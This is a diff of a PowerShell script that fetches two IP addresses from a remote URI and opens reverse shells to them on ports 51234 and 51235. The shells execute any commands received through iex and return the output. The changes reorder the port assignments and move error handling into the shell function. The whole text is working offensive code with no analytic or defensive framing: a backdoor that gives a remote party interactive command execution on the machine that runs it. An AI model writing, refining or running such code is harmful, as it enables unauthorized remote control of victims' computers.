@@ -6,35 +6,32 @@ $content = Invoke-RestMethod -Uri $uri
 $mobileIP = ($content -split 'm=')[1].Split('=')[0].Trim()
 $pcIP = ($content -split 'p=')[1].Split('=')[0].Trim()
 
-# Ports for each connection
-$mobilePort = 51234        # Port for mobile connection
-$pcPort = 51235            # Port for PC connection
+# Define ports
+$pcPort = 51234       # Port for PC connection
+$mobilePort = 51235   # Port for mobile connection
 
 # Function to create reverse shell
 function Start-ReverseShell($ip, $port) {
-    $client = New-Object System.Net.Sockets.TCPClient($ip, $port);
-    $stream = $client.GetStream();
-    [byte[]]$bytes = 0..65535|%{0};
-    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
-        $sendback = (iex $data 2>&1 | Out-String );
-        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
-        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-        $stream.Write($sendbyte,0,$sendbyte.Length);
-        $stream.Flush()
-    };
-    $client.Close()
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient($ip, $port);
+        $stream = $client.GetStream();
+        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 };
+        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+            $sendback = (iex $data 2>&1 | Out-String);
+            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($sendbyte, 0, $sendbyte.Length);
+            $stream.Flush()
+        };
+        $client.Close()
+    } catch {
+        Write-Host "Could not connect to IP: $ip on port: $port"
+    }
 }
 
-# Try connecting to both IPs
-try {
-    Start-ReverseShell($mobileIP, $mobilePort)
-} catch {
-    Write-Host "Could not connect to mobile IP: $mobileIP"
-}
+# Start reverse shell for PC
+Start-ReverseShell($pcIP, $pcPort)
 
-try {
-    Start-ReverseShell($pcIP, $pcPort)
-} catch {
-    Write-Host "Could not connect to PC IP: $pcIP"
-}
+# Start reverse shell for mobile
+Start-ReverseShell($mobileIP, $mobilePort)
